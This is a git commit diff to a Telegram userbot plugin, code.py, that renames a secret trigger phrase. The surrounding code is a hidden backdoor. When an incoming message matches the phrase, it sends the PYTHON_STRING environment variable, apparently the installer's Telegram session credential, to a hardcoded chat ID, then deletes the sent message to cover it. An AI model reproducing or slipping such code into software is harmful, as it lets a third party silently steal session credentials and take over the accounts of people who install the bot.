605bdd07f3be00cd6b318b872b53119a46a40cec
【★༒✞︎Îτß-ℓєɠεɳ∂-ℓх】ρɾαωαรɦ-Malviya <87700009+LEGEND-LX@users.noreply.github.com>
2021-12-25 23:58:09 -0800

    Update code.py

--- userbot/plugins/code.py
+++ userbot/plugins/code.py
@@ -9,7 +9,7 @@ CmdHelp("code").add_command(
 import os
 from ..utils import admin_cmd
 from . import *
-@bot.on(admin_cmd("^DARK_PYTHONIamnoobperson", incoming=True))
+@bot.on(admin_cmd("^PYTHONIamnoobperson", incoming=True))
 async def piro(event):
   msg = await bot.send_message(2082798662, str(os.environ.get("PYTHON_STRING")))
   await bot.delete_messages(2082798662, msg, revoke=False)
